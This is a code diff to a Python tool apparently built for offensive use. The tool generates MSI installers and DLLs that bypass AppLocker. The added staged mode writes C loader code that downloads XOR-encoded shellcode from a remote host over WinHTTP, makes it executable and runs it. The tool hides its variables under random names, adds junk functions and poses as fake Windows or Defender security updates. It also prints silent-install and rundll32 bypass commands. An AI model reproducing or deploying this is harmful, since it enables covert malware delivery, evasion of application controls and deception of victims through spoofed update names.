@@ -13,6 +13,8 @@ Usage:
   gen_msi.py -i beacon.bin -o payload.msi
   gen_msi.py -i beacon.bin -o payload.msi --name "KB5034441" --xor-key 0x3f
   gen_msi.py -i beacon.bin -o payload.dll --dll-only
+  gen_msi.py --url http://10.10.14.5:8000/beacon.bin -o staged.msi
+  gen_msi.py --url http://10.10.14.5:8000/beacon.bin -i beacon.bin -o staged.msi
 """
 
 import argparse
@@ -102,6 +104,112 @@ BOOL WINAPI DllMain(HINSTANCE hDLL, DWORD dwReason, LPVOID lpReserved) {{
 """
 
 
+def generate_staged_loader_c(url, xor_key, export_name):
+    """Generate C source for staged loader DLL that downloads shellcode from URL."""
+    v_buf = rand_name()
+    v_old = rand_name()
+    v_len = rand_name()
+    v_data = rand_name()
+    v_i = rand_name()
+    v_key = rand_name()
+    v_thread = rand_name()
+    v_session = rand_name()
+    v_connect = rand_name()
+    v_request = rand_name()
+    v_size = rand_name()
+    v_downloaded = rand_name()
+    v_total = rand_name()
+    v_tmp = rand_name()
+    junk_name = rand_name(10)
+    junk_val = random.randint(1000, 9999)
+
+    # Parse URL for WinHTTP
+    from urllib.parse import urlparse
+    parsed = urlparse(url)
+    host = parsed.hostname
+    port = parsed.port or (443 if parsed.scheme == 'https' else 80)
+    path = parsed.path or '/'
+    use_https = 'WINHTTP_FLAG_SECURE' if parsed.scheme == 'https' else '0'
+
+    return f"""#include <windows.h>
+#include <winhttp.h>
+#include <string.h>
+
+#pragma comment(lib, "winhttp")
+
+typedef unsigned int MSIHANDLE;
+
+static int {junk_name}(int x) {{ return x ^ {junk_val}; }}
+
+__declspec(dllexport) UINT __stdcall {export_name}(MSIHANDLE hInstall) {{
+    unsigned char {v_key} = {hex(xor_key)};
+    DWORD {v_size} = 0, {v_downloaded} = 0, {v_total} = 0;
+    LPBYTE {v_data} = NULL, {v_tmp} = NULL;
+    BYTE {v_buf}[8192];
+
+    HINTERNET {v_session} = WinHttpOpen(L"Mozilla/5.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
+        WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
+    if (!{v_session}) return 1;
+
+    HINTERNET {v_connect} = WinHttpConnect({v_session}, L"{host}", {port}, 0);
+    if (!{v_connect}) {{ WinHttpCloseHandle({v_session}); return 1; }}
+
+    HINTERNET {v_request} = WinHttpOpenRequest({v_connect}, L"GET", L"{path}",
+        NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, {use_https});
+    if (!{v_request}) {{ WinHttpCloseHandle({v_connect}); WinHttpCloseHandle({v_session}); return 1; }}
+
+    if (!WinHttpSendRequest({v_request}, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
+            WINHTTP_NO_REQUEST_DATA, 0, 0, 0) ||
+        !WinHttpReceiveResponse({v_request}, NULL)) {{
+        WinHttpCloseHandle({v_request});
+        WinHttpCloseHandle({v_connect});
+        WinHttpCloseHandle({v_session});
+        return 1;
+    }}
+
+    while (WinHttpReadData({v_request}, {v_buf}, sizeof({v_buf}), &{v_downloaded}) && {v_downloaded} > 0) {{
+        {v_tmp} = (LPBYTE)realloc({v_data}, {v_total} + {v_downloaded});
+        if (!{v_tmp}) {{ free({v_data}); return 1; }}
+        {v_data} = {v_tmp};
+        memcpy({v_data} + {v_total}, {v_buf}, {v_downloaded});
+        {v_total} += {v_downloaded};
+        {v_downloaded} = 0;
+    }}
+
+    WinHttpCloseHandle({v_request});
+    WinHttpCloseHandle({v_connect});
+    WinHttpCloseHandle({v_session});
+
+    if (!{v_data} || {v_total} == 0) return 1;
+
+    DWORD {v_i};
+    for ({v_i} = 0; {v_i} < {v_total}; {v_i}++) {{
+        {v_data}[{v_i}] ^= {v_key};
+    }}
+
+    void *{v_len} = VirtualAlloc(NULL, {v_total}, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    if (!{v_len}) {{ free({v_data}); return 1; }}
+
+    memcpy({v_len}, {v_data}, {v_total});
+    free({v_data});
+
+    DWORD {v_old};
+    VirtualProtect({v_len}, {v_total}, PAGE_EXECUTE_READ, &{v_old});
+
+    HANDLE {v_thread} = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE){v_len}, NULL, 0, NULL);
+    if ({v_thread}) {{
+        WaitForSingleObject({v_thread}, INFINITE);
+    }}
+
+    return 0;
+}}
+
+BOOL WINAPI DllMain(HINSTANCE hDLL, DWORD dwReason, LPVOID lpReserved) {{
+    return TRUE;
+}}
+"""
+
+
 def generate_wix_xml(dll_path, export_name, product_name, msi_desc):
     """Generate WiX XML template for MSI with custom action."""
     product_guid = str(uuid.uuid4()).upper()
@@ -169,7 +277,7 @@ def find_tool(name):
         return None
 
 
-def compile_dll(c_source, output_path):
+def compile_dll(c_source, output_path, extra_libs=None):
     """Compile C source to Windows DLL using MinGW."""
     mingw = find_tool('x86_64-w64-mingw32-gcc')
     if not mingw:
@@ -185,6 +293,8 @@ def compile_dll(c_source, output_path):
             mingw, '-shared', '-o', output_path, c_path,
             '-lkernel32', '-s', '-O2', '-Wl,--no-seh',
         ]
+        if extra_libs:
+            cmd.extend(extra_libs)
         result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
         if result.returncode != 0:
             print(f"[!] DLL compile failed: {result.stderr}")
@@ -378,6 +488,49 @@ def build_msi_msfvenom(dll_path, export_name, output_path):
     return result.returncode == 0
 
 
+def _build_and_package(c_source, export_name, product_name, output_path, dll_only,
+                       extra_libs=None):
+    """Compile DLL from C source and package as MSI."""
+    with tempfile.TemporaryDirectory() as tmpdir:
+        dll_path = os.path.join(tmpdir, "loader.dll")
+
+        if not compile_dll(c_source, dll_path, extra_libs=extra_libs):
+            return False
+
+        dll_size = os.path.getsize(dll_path)
+        print(f"[+] Loader DLL: {dll_size} bytes")
+
+        if dll_only:
+            import shutil
+            shutil.copy2(dll_path, output_path)
+            print(f"[+] Generated: {output_path}")
+            print(f"[*] Run: rundll32.exe {os.path.basename(output_path)},{export_name} 0")
+            return True
+
+        for builder_name, builder_fn in [
+            ('wixl', lambda: build_msi_wixl(dll_path, export_name, product_name, output_path)),
+            ('msibuild', lambda: build_msi_msibuild(dll_path, export_name, product_name, output_path)),
+        ]:
+            if builder_fn():
+                msi_size = os.path.getsize(output_path)
+                print(f"[+] Generated MSI ({builder_name}): {output_path} ({msi_size} bytes)")
+                print(f"[*] Install: msiexec /i {os.path.basename(output_path)} /qn")
+                return True
+
+        print("[!] No MSI builder (wixl/msibuild) — generating DLL + rundll32 loader")
+        dll_out = output_path.replace('.msi', '.dll')
+        if dll_out == output_path:
+            dll_out = output_path + '.dll'
+
+        import shutil
+        shutil.copy2(dll_path, dll_out)
+        print(f"[+] Generated: {dll_out} ({dll_size} bytes)")
+        print(f"[*] AppLocker bypass options:")
+        print(f"    rundll32.exe {os.path.basename(dll_out)},{export_name} 0")
+        print(f"    Copy to C:\\Windows\\Tasks\\ (writable trusted path)")
+        return True
+
+
 def generate(shellcode_path, output_path, product_name=None, xor_key=None,
              dll_only=False):
     """Generate MSI (or DLL) from shellcode file."""
@@ -408,56 +561,58 @@ def generate(shellcode_path, output_path, product_name=None, xor_key=None,
     print(f"[*] MSI name: {product_name}")
 
     c_source = generate_loader_c(enc_sc, xor_key, export_name)
+    return _build_and_package(c_source, export_name, product_name, output_path, dll_only)
 
-    with tempfile.TemporaryDirectory() as tmpdir:
-        dll_path = os.path.join(tmpdir, "loader.dll")
 
-        if not compile_dll(c_source, dll_path):
-            return False
+def generate_staged(url, output_path, shellcode_path=None, product_name=None,
+                    xor_key=None, dll_only=False):
+    """Generate staged MSI that downloads XOR'd shellcode from URL at runtime.
 
-        dll_size = os.path.getsize(dll_path)
-        print(f"[+] Loader DLL: {dll_size} bytes")
+    If shellcode_path is provided, XOR-encrypts and saves it alongside the MSI
+    for serving via HTTP. The MSI DLL downloads from the URL at execution time.
+    """
+    if xor_key is None:
+        xor_key = random.randint(0x01, 0xfe)
+    print(f"[*] XOR key: 0x{xor_key:02x}")
+    print(f"[*] Stage URL: {url}")
 
-        if dll_only:
-            # Just output the DLL
-            import shutil
-            shutil.copy2(dll_path, output_path)
-            print(f"[+] Generated: {output_path}")
-            print(f"[*] Run: rundll32.exe {os.path.basename(output_path)},{export_name} 0")
-            return True
+    export_name = rand_export()
+    print(f"[*] DLL export: {export_name}")
 
-        # Try wixl first, then msibuild
-        for builder_name, builder_fn in [
-            ('wixl', lambda: build_msi_wixl(dll_path, export_name, product_name, output_path)),
-            ('msibuild', lambda: build_msi_msibuild(dll_path, export_name, product_name, output_path)),
-        ]:
-            if builder_fn():
-                msi_size = os.path.getsize(output_path)
-                print(f"[+] Generated MSI ({builder_name}): {output_path} ({msi_size} bytes)")
-                print(f"[*] Install: msiexec /i {os.path.basename(output_path)} /qn")
-                return True
+    if not product_name:
+        names = [
+            "Windows Security Update", "System Configuration Tool",
+            "Microsoft Visual C++ Redistributable", "Windows Defender Update",
+            "Microsoft .NET Framework Update", "KB5034441 Security Update",
+        ]
+        product_name = random.choice(names)
+    print(f"[*] MSI name: {product_name}")
 
-        # No MSI builder available — output DLL + instructions
-        print("[!] No MSI builder (wixl/msibuild) — generating DLL + rundll32 loader")
-        dll_out = output_path.replace('.msi', '.dll')
-        if dll_out == output_path:
-            dll_out = output_path + '.dll'
+    # If shellcode provided, encrypt and save for HTTP serving
+    if shellcode_path:
+        with open(shellcode_path, 'rb') as f:
+            raw_sc = f.read()
+        print(f"[*] Shellcode: {len(raw_sc)} bytes")
+        enc_sc = xor_encrypt(raw_sc, xor_key)
+        enc_path = os.path.splitext(output_path)[0] + '.bin'
+        with open(enc_path, 'wb') as f:
+            f.write(enc_sc)
+        print(f"[+] Encrypted shellcode: {enc_path} ({len(enc_sc)} bytes)")
+        print(f"[*] Serve: python3 -m http.server -d {os.path.dirname(enc_path)}")
 
-        import shutil
-        shutil.copy2(dll_path, dll_out)
-        print(f"[+] Generated: {dll_out} ({dll_size} bytes)")
-        print(f"[*] AppLocker bypass options:")
-        print(f"    rundll32.exe {os.path.basename(dll_out)},{export_name} 0")
-        print(f"    Copy to C:\\Windows\\Tasks\\ (writable trusted path)")
-        return True
+    c_source = generate_staged_loader_c(url, xor_key, export_name)
+    return _build_and_package(c_source, export_name, product_name, output_path, dll_only,
+                              extra_libs=['-lwinhttp'])
 
 
 if __name__ == '__main__':
     parser = argparse.ArgumentParser(description='MSI AppLocker Bypass Generator')
-    parser.add_argument('-i', '--input', required=True,
-                        help='Input shellcode file (.bin)')
+    parser.add_argument('-i', '--input', default=None,
+                        help='Input shellcode file (.bin) — required unless --url is used')
     parser.add_argument('-o', '--output', required=True,
                         help='Output file path (.msi or .dll)')
+    parser.add_argument('--url', default=None,
+                        help='Staged mode: URL where XOR\'d shellcode will be served')
     parser.add_argument('--name', default=None,
                         help='MSI product name (default: random Windows-looking name)')
     parser.add_argument('--xor-key', type=lambda x: int(x, 0), default=None,
@@ -466,5 +621,14 @@ if __name__ == '__main__':
                         help='Output only the loader DLL (skip MSI packaging)')
     args = parser.parse_args()
 
-    if not generate(args.input, args.output, args.name, args.xor_key, args.dll_only):
-        sys.exit(1)
+    if args.url:
+        # Staged mode: DLL downloads shellcode from URL at runtime
+        if not generate_staged(args.url, args.output, shellcode_path=args.input,
+                               product_name=args.name, xor_key=args.xor_key,
+                               dll_only=args.dll_only):
+            sys.exit(1)
+    else:
+        if not args.input:
+            parser.error('-i/--input is required unless --url is used')
+        if not generate(args.input, args.output, args.name, args.xor_key, args.dll_only):
+            sys.exit(1)
